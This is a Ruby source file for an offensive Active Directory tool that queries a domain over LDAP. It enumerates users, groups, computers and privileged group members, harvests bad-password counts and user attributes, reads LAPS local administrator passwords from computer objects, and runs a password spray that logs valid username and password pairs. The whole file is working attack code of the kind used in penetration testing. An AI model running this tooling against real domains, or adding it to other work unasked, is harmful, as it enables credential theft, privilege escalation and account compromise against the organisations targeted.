#!/usr/bin/env ruby

# ldap_querier.rb
# Sanjiv Kawa
# @kawabungah

require 'rubygems'
require 'progressbar'
require 'socket'

$domain = Credentials.new.domain

# This method will check to see if the IP address and port for the remote host is open
def remote_check(ip, port)
  begin
    s = Socket.tcp(ip, port, connect_timeout: 0.4)
    s.close()
    return true
  rescue StandardError
    return "[!] Connection failed! Target at #{ip}:#{port} is unreachable"
    exit
  end
end

# verify if the credentials in credentials.yaml are valid
def validate_credentials(ldap)
  remote_check = remote_check(ldap.host,389)
  if remote_check == true
    if ldap.bind
      return true
    else
      return "[!] Connection failed! Code: #{ldap.get_operation_result.code}, message: #{ldap.get_operation_result.message}"
    end
  else
      return remote_check
  end
end

# grab all groups in the domain
def domain_groups(ldap)
  arr = []
  filter = Net::LDAP::Filter.eq("objectClass", "group")
  ldap.search( :filter => filter ) do |entry|
    arr.push entry.name
  end
  file = "#{$domain}-groups.txt"
  puts "[+] Groups for #{$domain} have been written to #{file}"
  output_file(file,arr)
end

# grab all users in the domain
def domain_users(ldap)
  arr = []
  search_filter = Net::LDAP::Filter.eq("objectClass", "user")
  ldap.search( :filter => search_filter) do |entry|
    unless entry.samaccountname[0][-1].include? '$'
      arr.push entry.samaccountname.join(",")
    end
  end
  file = "#{$domain}-users.txt"
  puts "[+] Users for #{$domain} have been written to #{file}"
  output_file(file,arr)
  return arr
end

def domain_users_file(ldap)
  du = []
  file = "#{$domain}-users.txt"
  if File.exist?(file) == true
    File.open(file).each do |line|
      du.push line.chomp
    end
  else
    du = domain_users(ldap)
  end
  return du
end

# grab all computers in the domain
def domain_computers(ldap)
  arr = []
  fqdn = Credentials.new.dn_base.gsub('dc=','.').gsub(',','')
  filter = Net::LDAP::Filter.eq("samaccountName", "*")
  filter2 = Net::LDAP::Filter.eq("objectCategory", "computer")

  joined_filter = Net::LDAP::Filter.join(filter, filter2)

  ldap.search( :filter =>joined_filter) do |entry|
    computer = entry.samaccountName
    arr.push computer.join("\n").to_s.gsub("$",fqdn)
  end

  file = "#{$domain}-computers.txt"
  puts "[+] Computers for #{$domain} have been written to #{file}"
  output_file(file,arr)
  return arr
end

# list the groups that a supplied user is a member of
def user_group_membership(ldap,user)
  arr = []
  arr.push "Domain Users"
  search_filter = Net::LDAP::Filter.eq("samaccountname", user)
  result_attributes = ["memberof"]
  results = ldap.search(:filter => search_filter, :attributes => result_attributes)

  if results.empty? == true
    puts "[!] #{user} does not exist in #{$domain} domain"
  else
    member_of = results[0][:memberof]
    for i in 0 .. member_of.length-1
      arr.push member_of[i].split(",")[0].split("=")[1]
    end
    file = "#{$domain}-#{user.gsub(" ","-")}-groups.txt"
    puts "[+] Groups that #{user} is a member of have been written to #{file}"
    output_file(file,arr.uniq)
  end
end

# list the users in a supplied group
def group_membership(ldap,group)
  arr = []
  search_filter = Net::LDAP::Filter.eq("cn", group)
  results = ldap.search(:filter => search_filter)

  if results.empty? == true
    puts "[!] #{group} does not exist in #{$domain} domain"
  else
    membership = results[0][:member]
    for i in 0 .. membership.length-1
      arr.push membership[i].split(",")[0].split("=")[1]
    end
    file = "#{$domain}-#{group.gsub(" ","-")}.txt"
    puts "[+] Members in #{group} have been written to #{file}"
    output_file(file,arr)
  end
  return arr
end

# cycle through common privileged groups and retrieve membership
def privileged_group_membership(ldap)
  admin_arr = []
  group_arr = ["Domain Admins", "Enterprise Admins", "Administrators"]

  group_arr.each do |group|
    admin_arr += group_membership(ldap,group)
  end

  du = domain_users_file(ldap)

  admin_arr.each do |group|
    if du.include?(group)
      user_group_membership(ldap,group)
    else
      group_membership(ldap,group)
    end
  end
end

# get the bad password count for all users in the domain
def bad_password(ldap)
  arr = []
  du = domain_users_file(ldap)

  for i in 0 .. du.length - 1
    search_filter = Net::LDAP::Filter.eq("sAMAccountName", du[i])
    ldap.search( :filter => search_filter, :attributes => "badpwdcount", :return_result => false) do |entry|
      arr.push "#{du[i]}: #{entry.badpwdcount.join(",")}"
    end
  end
  file = "#{$domain}-bad-password.txt"
  puts "[+] Bad passwords for #{$domain} have been written to #{file}"
  output_file(file,arr)
end

# grab the most popular attributes for domain users
def attributes(ldap)
  du = domain_users_file(ldap)
  arr = []

  result_attrs = ["displayname", "mail", "description", "pwdlastset", "telephonenumber", "admincount", "badpwdcount"]

  puts "[+] Grabbing attributes for all domain users\n\n"

  progressbar = ProgressBar.create(:total => du.length)

  for i in 0 .. du.length - 1
    search_filter = Net::LDAP::Filter.eq("sAMAccountName", du[i])
    ldap.search(:filter => search_filter, :attributes => result_attrs, :return_result => false) do |a|
      arr.push "#{$domain}\\#{du[i]}"
      a.each do |attribute, value|
          arr.push "\t#{attribute}: #{value.first}"
      end
        arr.push ""
    end
    progressbar.increment
  end

  file = "#{$domain}-attributes.txt"
  puts "\n[+] Attributes for all domain users have been written to #{file}"
  output_file(file,arr)
end

def laps_password(ldap)
  arr = []
  computers = domain_computers(ldap)

  result_attrs = ["ms-mcs-admpwd", "ms-mcs-admpwdexpirationtime"]

  for i in 0 .. computers.length - 1
    search_filter = Net::LDAP::Filter.eq("cn",  computers[i].split(".")[0])

    ldap.search(:filter => search_filter, :attributes => result_attrs) do |a|
      a.each do |attribute, value|
          puts "#{attribute}: #{value.first}"
          arr.push "#{attribute}: #{value.first}"
      end
    end
    puts ""
    arr.push "\n"
  end
  file = "#{$domain}-laps-password.txt"
  puts "[+] LAPS password for all domain computers have been written to #{file}"
  output_file(file,arr)
end

# run popular options
def run_all(ldap)
  bad_password(ldap)
  domain_groups(ldap)
  domain_users(ldap)
  domain_computers(ldap)
  privileged_group_membership(ldap)
  attributes(ldap)
end

# conduct a password spray against the target domain
def password_spray(user_file,password)
  users = []
  result = []

  t = Time.now
  date = t.to_s.split(" ")[0]
  time = t.to_s.split(" ")[1]

  if File.exist?(user_file) == true
    File.open(user_file).each do |line|
      users.push line.chomp
    end
  else
    puts "[!] #{user_file} does not exist"
    exit
  end

  for i in 0 .. users.length - 1
    username = users[i]
    ldap = Connect.new.spray(username,password)
    state = validate_credentials(ldap)
    creds = "#{$domain}\\#{username} #{password}"

    if state == true
      puts "[+] (#{i+1}/#{users.length}) Success #{creds}"
      result.push "[+] (#{i+1}/#{users.length}) Success #{creds}"
    else
      puts "[-] (#{i+1}/#{users.length}) Failed #{creds}"
      result.push "[-] (#{i+1}/#{users.length}) Failed #{creds}"
    end
  end

  file = "#{$domain}-password-attack-#{password}-#{date}-#{time}.txt"
  output_file(file,result)
  puts "[+] Password spray for #{$domain} has been written to #{file}"
end

# write results out to a file
def output_file(file_name,content)
  output = File.open(file_name,"w")
  output.write(content.join("\n"))
  output.close
end
